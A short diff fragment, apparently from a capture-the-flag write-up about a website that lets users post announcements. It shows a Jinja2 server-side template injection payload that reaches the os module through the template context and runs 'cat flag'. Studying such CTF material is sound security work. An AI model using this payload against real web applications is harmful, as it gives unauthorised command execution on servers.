@@ -13,4 +13,3 @@ I made a cool website where you can announce whatever you want! Try it out! I he
 //check this too//
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘cat flag’).read() }}
 ```
-
